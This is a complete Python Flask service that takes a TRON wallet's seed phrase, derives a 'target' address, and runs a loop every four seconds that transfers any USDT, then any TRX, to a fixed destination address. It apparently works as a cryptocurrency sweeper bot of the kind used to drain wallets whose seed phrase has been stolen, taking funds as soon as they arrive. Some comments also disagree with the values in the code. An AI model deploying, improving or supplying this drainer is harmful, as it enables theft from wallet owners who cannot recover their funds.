import os
import time
import threading
from flask import Flask, jsonify
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from tronpy.hdwallet import seed_from_mnemonic, key_from_seed

app = Flask(__name__)

# --- 1. Configuration ---
MNEMONIC_PHRASE = os.environ.get("MNEMONIC")
DEST_TRON = os.environ.get("DESTINATION_TRON_ADDRESS")
TRONGRID_KEY = os.environ.get("TRONGRID_API_KEY")

# --- LOOP SETTINGS ---
LOOP_SLEEP_TIME = 4  # Wait 4 seconds between checks ONLY when empty
MIN_SWEEP_THRESHOLD = 0.3  # Do not sweep if balance is less than 0.1 TRX
# ----------------------------

# --- 3. Client Setup & Wallet Derivation ---
provider = HTTPProvider(endpoint_uri="https://api.trongrid.io", api_key=TRONGRID_KEY) if TRONGRID_KEY else None
tron_client = Tron(provider=provider) if provider else Tron(network='mainnet')

try:
    seed = seed_from_mnemonic(MNEMONIC_PHRASE, "")
    priv_key_bytes = key_from_seed(seed, account_path="m/44'/195'/0'/0/0")
    tron_pk = PrivateKey(priv_key_bytes)
    TARGET_TRON = tron_pk.public_key.to_base58check_address()
    print(f"[inf]  [+] Successfully derived Target TRON Address: {TARGET_TRON}")
except Exception as e:
    print(f"[err]  [-] Invalid Seed Phrase or Derivation Error: {str(e)}")
    TARGET_TRON = None

TRON_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
usdt_contract = tron_client.get_contract(TRON_USDT_CONTRACT)

# --- 4. Logic: Sweep USDT (Prioritized First) ---
def sweep_tron_usdt():
    if not TARGET_TRON:
        return False
    try:
        balance = usdt_contract.functions.balanceOf(TARGET_TRON)
        if balance > 0:
            print(f"[inf]  [+] USDT detected! Sweeping ALL instantly: {balance / 1_000_000}")
            txn = (
                usdt_contract.functions.transfer(DEST_TRON, balance)
                .with_owner(TARGET_TRON)
                .fee_limit(150_000_000) # SAFELY INCREASED TO 150 TRX CAP
                .build()
                .sign(tron_pk)
            )
            txn.broadcast()
            return True
        return False
    except Exception as e:
        print(f"[err]  [-] USDT Sweep Error: {str(e)}")
        # Returning True here protects incoming TRX from being swept if USDT fails (e.g. no gas)
        return True 

# --- 5. Logic: Sweep TRX ---
def sweep_tron_trx():
    if not TARGET_TRON:
        return False
    try:
        balance_trx = tron_client.get_account_balance(TARGET_TRON)
        balance_sun = int(float(balance_trx) * 1_000_000)
        
        # PROPER TRONPY RESOURCE CALL
        free_bandwidth = 0
        try:
            acc_res = tron_client.get_account_resource(TARGET_TRON)
            free_bandwidth = acc_res.get("freeNetLimit", 0) - acc_res.get("freeNetUsed", 0)
        except Exception:
            pass
        
        # EXACT FEE ESTIMATION
        # TRX transfers require ~268 bandwidth points. If no free bandwidth, it costs ~268,000 sun.
        fee_sun = 0 if free_bandwidth >= 300 else 300_000 
            
        # Only sweep if above threshold AND covers the fee
        if balance_sun > (MIN_SWEEP_THRESHOLD * 1_000_000) and balance_sun > fee_sun:
            
            amount_to_send = balance_sun - fee_sun
            print(f"[inf]  [+] TRX detected! Sweeping instantly: {amount_to_send/1_000_000} TRX (Reserved {fee_sun/1_000_000} for fees)")
            
            txn = (
                tron_client.trx.transfer(TARGET_TRON, DEST_TRON, amount_to_send)
                .build()
                .sign(tron_pk)
            )
            txn.broadcast()
            return True
        return False
    except Exception as e:
        print(f"[err]  [-] TRX Sweep Error: {str(e)}")
    return False

# --- 6. Sweeper Loop (Prioritizes USDT first) ---
def sweeper_loop():
    while True:
        try:
            if not sweep_tron_usdt():
                sweep_tron_trx()
        except:
            pass
        time.sleep(LOOP_SLEEP_TIME)

if TARGET_TRON:
    threading.Thread(target=sweeper_loop, daemon=True).start()

@app.route('/')
def health_check(): 
    return jsonify({"status": "running", "target_address": TARGET_TRON}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8000)))
